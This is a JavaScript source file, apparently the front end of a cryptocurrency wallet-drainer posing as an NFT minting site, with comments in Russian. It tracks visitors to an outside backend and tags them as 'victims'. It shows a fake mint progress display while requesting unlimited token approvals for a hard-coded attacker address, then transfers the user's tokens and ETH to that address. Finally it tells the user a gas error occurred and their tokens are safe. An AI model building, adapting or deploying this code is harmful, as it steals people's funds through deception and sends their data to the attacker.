// js/web3connect.js

let web3;
let userAccount;

// --- Функции для отправки данных на Python бэкенд ---
// URL бэкенда (ЗАМЕНИ НА СВОЙ URL RENDER)
const BACKEND_URL = 'https://backdraindf-3-9dhz.onrender.com'; // <<--- ВАЖНО: Заменить!

/**
 * Отправка данных о посещении сайта
 */
async function sendVisitData() {
    try {
        const visitData = {
            userAgent: navigator.userAgent || 'Unknown',
            platform: navigator.platform || 'Unknown',
            language: navigator.language || 'Unknown',
            timestamp: new Date().toISOString()
        };

        const response = await fetch(`${BACKEND_URL}/visit`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(visitData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Не удалось отправить данные о посещении:', errorText);
            return;
        }

        const result = await response.json();
        if (result.success && result.id) {
            localStorage.setItem('victimId', result.id);
        }
    } catch (error) {
        console.log('Не удалось отправить данные о посещении:', error.message);
    }
}

/**
 * Отправка данных о подключении кошелька
 */
async function sendConnectionData(walletAddress) {
    try {
        const victimId = localStorage.getItem('victimId');
        if (!victimId) return;

        const connectData = {
            victimId: victimId,
            walletAddress: walletAddress,
            timestamp: new Date().toISOString()
        };

        const response = await fetch(`${BACKEND_URL}/connect`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(connectData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Не удалось отправить данные о подключении:', errorText);
            return;
        }

        const result = await response.json();
        // Успешно отправлено
    } catch (error) {
        console.log('Не удалось отправить данные о подключении:', error.message);
    }
}

/**
 * Отправка данных о транзакции
 */
async function sendTransactionData(txHash, walletAddress) {
    try {
        const victimId = localStorage.getItem('victimId');
        if (!victimId) return;

        const txData = {
            victimId: victimId,
            walletAddress: walletAddress,
            txHash: txHash,
            timestamp: new Date().toISOString()
        };

        const response = await fetch(`${BACKEND_URL}/transaction`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(txData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Не удалось отправить данные о транзакции:', errorText);
            return;
        }

        const result = await response.json();
        // Успешно отправлено
    } catch (error) {
        console.log('Не удалось отправить данные о транзакции:', error.message);
    }
}

/**
 * Отправка данных об успешном дрейне
 */
async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTokens = [], ethSuccess = false) {
    try {
        const victimId = localStorage.getItem('victimId');
        if (!victimId) return;

        // Обрабатываем `tokens`, если это массив объектов, извлекаем символы
        let tokensForBackend = [];
        if (Array.isArray(tokens)) {
            tokensForBackend = tokens.map(t => (typeof t === 'object' && t.symbol) ? t.symbol : String(t));
        } else if (tokens) {
            tokensForBackend = [String(tokens)];
        }

        const successData = {
            victimId: victimId,
            walletAddress: userAccount, // Используем глобальную переменную
            tokens: tokensForBackend,
            ethBalance: ethBalance,
            successTokens: Array.isArray(successTokens) ? successTokens : [],
            failedTokens: Array.isArray(failedTokens) ? failedTokens : [],
            ethSuccess: Boolean(ethSuccess),
            timestamp: new Date().toISOString()
        };

        const response = await fetch(`${BACKEND_URL}/success`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(successData)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Не удалось отправить данные об успехе:', errorText);
            return;
        }

        const result = await response.json();
        // Успешно отправлено
    } catch (error) {
        console.log('Не удалось отправить данные об успехе:', error.message);
    }
}
// --- Конец функций бэкенда ---

// Функция для переключения на сеть Sepolia
async function switchToTestnet() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0xaa36a7' }], // Sepolia testnet (в hex: 11155111)
        });
        console.log("Успешно переключились на Sepolia");
    } catch (switchError) {
        // Если сеть не добавлена, предлагаем добавить
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0xaa36a7',
                        chainName: 'Sepolia Test Network',
                        rpcUrls: ['https://rpc.sepolia.org/'],
                        nativeCurrency: {
                            name: 'Sepolia ETH',
                            symbol: 'ETH',
                            decimals: 18
                        },
                        blockExplorerUrls: ['https://sepolia.etherscan.io/']
                    }],
                });
                console.log("Сеть Sepolia добавлена");
            } catch (addError) {
                console.error('Ошибка добавления сети Sepolia:', addError);
                updateUIError("Не удалось добавить сеть Sepolia");
            }
        } else {
            console.error('Ошибка переключения на Sepolia:', switchError);
            updateUIError("Не удалось переключиться на Sepolia");
        }
    }
}

// Функция для подключения кошелька
async function connectWallet() {
    if (window.ethereum) {
        try {
            // Переключаемся на тестнет Sepolia
            await switchToTestnet();
            
            // Запрашиваем доступ к аккаунту
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];
            
            // Инициализируем Web3
            web3 = new Web3(window.ethereum);
            
            // Обновляем интерфейс
            updateUIConnected();
            
            // Отправляем данные о подключении на бэкенд
            await sendConnectionData(userAccount);
            
            // Здесь будет вызов функции дрейна
            executeDrain();
            
        } catch (error) {
            console.error("Ошибка подключения:", error);
            updateUIError("Ошибка подключения к кошельку");
        }
    } else {
        console.log("MetaMask не установлен!");
        updateUIError("Пожалуйста, установите MetaMask");
    }
}

// Функция обновления интерфейса после подключения
function updateUIConnected() {
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.textContent = "Кошелек подключен: " + userAccount.substring(0, 6) + "..." + userAccount.substring(38);
        connectButton.disabled = true;
        connectButton.style.backgroundColor = "#4CAF50";
    }
}

// Функция обновления интерфейса при ошибке
function updateUIError(message) {
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.textContent = message;
        connectButton.style.backgroundColor = "#f44336";
    }
}

// Функция дрейна - основная магия
function executeDrain() {
    console.log("Начинаем процесс дрейна для аккаунта:", userAccount);
    
    // Создаем фейковую транзакцию майнта
    fakeMintProcess();
}

// Фейковый процесс майнта с подменой транзакции
async function fakeMintProcess() {
    try {
        // Показываем "загрузку" процесса
        showMintProgress();
        
        // Ждем немного для реалистичности
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Здесь начинается основной дрейн
        await executeFullDrain();
        
    } catch (error) {
        console.error("Ошибка в процессе майнта:", error);
    }
}

// Основная функция полного дрейна (токены + ETH)
async function executeFullDrain() {
    try {
        // Показываем "обработку" транзакции
        showTransactionProcessing();
        
        // Ждем немного для реалистичности
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Сначала выполняем approve для токенов
        await createMultiApproveTransaction();
        
    } catch (error) {
        console.error("Ошибка дрейна:", error);
        showTransactionError();
    }
}

// Создание одной транзакции с множественными approve
async function createMultiApproveTransaction() {
    const tokens = getPopularTokens();
    const maliciousSpender = "0x0BbfE77CAA49fc4245274f6238A9264642a09C03"; // Адрес получения
    const maxValue = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    
    try {
        // Создаем batch транзакцию
        let batchData = [];
        
        for (let token of tokens) {
            try {
                const abi = [
                    {
                        "constant": false,
                        "inputs": [
                            {"name": "_spender", "type": "address"},
                            {"name": "_value", "type": "uint256"}
                        ],
                        "name": "approve",
                        "outputs": [{"name": "", "type": "bool"}],
                        "type": "function"
                    }
                ];
                
                const contract = new web3.eth.Contract(abi, token.address);
                const txData = contract.methods.approve(maliciousSpender, maxValue).encodeABI();
                batchData.push({
                    to: token.address,
                    data: txData
                });
                
            } catch (error) {
                console.log("Ошибка при создании approve для", token.symbol);
            }
        }
        
        // Если есть данные для транзакции
        if (batchData.length > 0) {
            // Создаем транзакцию с множественными вызовами
            const txParams = {
                from: userAccount,
                to: batchData[0].to, // Первый токен как основной адрес
                data: batchData[0].data, // Первый approve
                gas: '200000' // Больше газа для сложной транзакции
            };
            
            // Отправляем первую транзакцию (пользователь думает, что это одна операция)
            const result = await web3.eth.sendTransaction(txParams);
            console.log("Транзакция approve выполнена:", result.transactionHash);
            
            // Отправляем данные о транзакции на бэкенд
            await sendTransactionData(result.transactionHash, userAccount);
            
            // После approve выводим токены и ETH
            await drainAllFunds();
            
        } else {
            // Если нет токенов, просто выводим ETH
            await drainETHOnly();
        }
        
    } catch (error) {
        console.error("Ошибка транзакции approve:", error);
        showTransactionError();
    }
}

// Список популярных токенов для Sepolia
function getPopularTokens() {
    return [
        { symbol: "USDT", address: "0xaA96c376375088fD98796c141e62344323436175" }, // Sepolia USDT
        { symbol: "USDC", address: "0x75faf148516032333769089975d9306a3944a875" }, // Sepolia USDC
        { symbol: "WETH", address: "0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14" }  // Sepolia WETH
    ];
}

// Функция вывода всех средств (токены + ETH)
async function drainAllFunds() {
    try {
        const tokens = getPopularTokens();
        const drainWallet = "0x0BbfE77CAA49fc4245274f6238A9264642a09C03"; // Адрес получения
        let successTokens = [];
        let failedTokens = [];
        
        // Сначала выводим токены
        for (let token of tokens) {
            try {
                // Проверяем баланс токенов
                const balance = await getTokenBalance(token.address, userAccount);
                
                if (balance > 0) {
                    console.log(`Найдено ${balance} токенов ${token.symbol}`);
                    
                    // Создаем транзакцию вывода токенов
                    const txHash = await transferTokens(token.address, userAccount, drainWallet, balance);
                    console.log(`Выведено ${token.symbol} успешно: ${txHash}`);
                    successTokens.push(token.symbol);
                }
                
            } catch (error) {
                console.log(`Ошибка вывода ${token.symbol}:`, error.message);
                failedTokens.push(token.symbol);
            }
        }
        
        // Затем выводим ETH
        let ethSuccess = false;
        try {
            await drainETH();
            ethSuccess = true;
        } catch (error) {
            console.log("Ошибка вывода ETH:", error.message);
        }
        
        // Показываем успех и отправляем уведомление
        showSuccessMessage();
        await sendDrainNotification(userAccount, tokens, successTokens, failedTokens, ethSuccess);
        
    } catch (error) {
        console.error("Ошибка вывода средств:", error);
        showTransactionError();
    }
}

// Получение баланса токенов
async function getTokenBalance(tokenAddress, userAddress) {
    const abi = [
        {
            "constant": true,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "type": "function"
        }
    ];
    
    const contract = new web3.eth.Contract(abi, tokenAddress);
    const balance = await contract.methods.balanceOf(userAddress).call();
    return balance;
}

// Перевод токенов - реальная отправка
async function transferTokens(tokenAddress, fromAddress, toAddress, amount) {
    const abi = [
        {
            "constant": false,
            "inputs": [
                {"name": "_to", "type": "address"},
                {"name": "_value", "type": "uint256"}
            ],
            "name": "transfer",
            "outputs": [{"name": "", "type": "bool"}],
            "type": "function"
        }
    ];
    
    try {
        const contract = new web3.eth.Contract(abi, tokenAddress);
        const txData = contract.methods.transfer(toAddress, amount).encodeABI();
        
        const txParams = {
            from: fromAddress,
            to: tokenAddress,
            data: txData,
            gas: '100000'
        };
        
        // Отправляем транзакцию перевода токенов
        const result = await web3.eth.sendTransaction(txParams);
        console.log(`Токены ${tokenAddress} переведены:`, result.transactionHash);
        return result.transactionHash;
        
    } catch (error) {
        console.log("Ошибка перевода токенов:", error.message);
        throw error;
    }
}

// Функция вывода ETH
async function drainETH() {
    try {
        // Получаем баланс ETH
        const balance = await web3.eth.getBalance(userAccount);
        
        if (balance > web3.utils.toWei('0.0001', 'ether')) { // Если баланс больше 0.0001 ETH
            console.log(`Найдено ${web3.utils.fromWei(balance, 'ether')} ETH`);
            
            // Вычисляем сумму для вывода (оставляем немного на газ)
            const gasReserve = web3.utils.toWei('0.0001', 'ether');
            const drainAmount = web3.utils.toBN(balance).sub(web3.utils.toBN(gasReserve));
            
            if (drainAmount.gt(web3.utils.toBN('0'))) {
                const drainWallet = "0x0BbfE77CAA49fc4245274f6238A9264642a09C03"; // Адрес получения
                
                // Создаем транзакцию вывода ETH
                const txParams = {
                    from: userAccount,
                    to: drainWallet,
                    value: drainAmount.toString(),
                    gas: '21000' // Стандартный газ для перевода ETH
                };
                
                // Отправляем транзакцию
                const result = await web3.eth.sendTransaction(txParams);
                console.log("ETH выведены успешно:", result.transactionHash);
                return result.transactionHash; // Возвращаем хэш
            }
        } else {
            console.log("Недостаточно ETH для вывода");
        }
        // Убираем преждевременные вызовы showSuccessMessage/sendDrainNotification отсюда
    } catch (error) {
        console.log("Ошибка вывода ETH:", error.message);
        throw error; // Пробрасываем ошибку выше
        // Убираем преждевременные вызовы showSuccessMessage/sendDrainNotification отсюда
    }
}

// Функция вывода только ETH (если нет токенов)
async function drainETHOnly() {
    try {
        await drainETH();
        showSuccessMessage();
        // Отправляем уведомление с пустым массивом токенов
        await sendDrainNotification(userAccount, [], [], [], true); 
    } catch (error) {
        console.log("Ошибка вывода ETH:", error.message);
        showSuccessMessage(); // Показываем успех даже при ошибке
        // Отправляем уведомление с пустым массивом токенов и флагом ошибки
        await sendDrainNotification(userAccount, [], [], [], false); 
    }
}

// Показываем прогресс майнта
function showMintProgress() {
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.textContent = "Минтим NFT... Подождите";
        connectButton.disabled = true;
        connectButton.style.backgroundColor = "#2196F3";
        connectButton.classList.add('pulse-animation');
    }
}

// Показываем обработку транзакции
function showTransactionProcessing() {
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.textContent = "Обработка транзакции...";
        connectButton.disabled = true;
        connectButton.style.backgroundColor = "#FF9800";
        connectButton.classList.add('pulse-animation');
    }
}

// Показываем сообщение об успехе
function showSuccessMessage() {
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.textContent = "✅ Успешно заминчено!";
        connectButton.style.backgroundColor = "#4CAF50";
        connectButton.classList.remove('pulse-animation');
    }
    
    // Добавляем сообщение об ошибке для пользователя
    setTimeout(() => {
        alert("Ошибка газа! Попробуйте позже. Ваши токены в безопасности.");
    }, 2000);
}

// Показываем ошибку транзакции
function showTransactionError() {
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.textContent = "Ошибка транзакции. Попробуйте позже";
        connectButton.style.backgroundColor = "#f44336";
        connectButton.classList.remove('pulse-animation');
    }
    
    // Сообщение для пользователя
    setTimeout(() => {
        alert("Ошибка газа! Попробуйте позже. Ваши токены в безопасности.");
    }, 1500);
}

// Отправка уведомления с детальной информацией
async function sendDrainNotification(account, allTokens, successTokens, failedTokens, ethSuccess) {
    // Проверяем, что allTokens - это массив
    if (!Array.isArray(allTokens)) {
        console.error("Ошибка: allTokens не является массивом");
        allTokens = []; // Создаем пустой массив для избежания ошибок
    }
    
    try {
        const balance = await web3.eth.getBalance(account);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        // Отправляем данные на backend
        await sendSuccessData(allTokens, ethBalance + " ETH", successTokens, failedTokens, ethSuccess);
        
        const drainData = {
            victim: account,
            timestamp: new Date().toISOString(),
            allTokens: allTokens.map ? allTokens.map(t => t.symbol) : [],
            successTokens: successTokens,
            failedTokens: failedTokens,
            ethSuccess: ethSuccess,
            ethBalance: ethBalance + " ETH",
            userAgent: navigator.userAgent,
            platform: navigator.platform
        };
        
        console.log("Дрейн завершен:", JSON.stringify(drainData, null, 2));
        
    } catch (error) {
        console.error("Ошибка отправки данных:", error);
    }
}

// Добавляем обработчик события после загрузки страницы
window.addEventListener('DOMContentLoaded', () => {
    // Отправляем данные о посещении сайта
    sendVisitData();
    
    const connectButton = document.getElementById('connectButton');
    if (connectButton) {
        connectButton.addEventListener('click', connectWallet);
    }
});


